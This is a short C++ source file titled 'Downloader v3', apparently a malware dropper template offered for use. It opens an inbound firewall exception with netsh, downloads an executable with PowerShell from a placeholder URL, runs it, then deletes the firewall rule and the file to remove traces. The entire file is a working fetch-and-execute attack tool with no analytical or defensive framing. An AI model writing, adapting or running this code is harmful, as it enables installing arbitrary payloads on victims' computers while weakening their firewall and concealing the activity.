// Downloader v3 by dEEpEst - C++ source code

#include <iostream>

int main()
{
    // Create firewall exception
    std::cout << "Create firewall exception\n";
    system("netsh advfirewall firewall add rule name=\"NAME_YOUR_RULE\" dir=in action=allow enable=yes");
    // Download file
    std::cout << "Download file\n";
    system("powershell -Command \"(New-Object System.Net.WebClient).DownloadFile('https://YOUR_URL_HERE.exe', 'YOUR_FILE.exe')\"");
    // Run file
    std::cout << "Run file\n";
    system("YOUR_FILE.exe");

    // Pause console to see the output
    system("pause");

    // Remove firewall exception
    std::cout << "Remove firewall exception\n";
    system("netsh advfirewall firewall delete rule name=\"NAME_YOUR_RULE\"");
    // Remove file
    std::cout << "Remove file\n";
    system("del YOUR_FILE.exe");
    // Exit
    std::cout << "Exit\n";
    system("pause");
    system("exit");
}
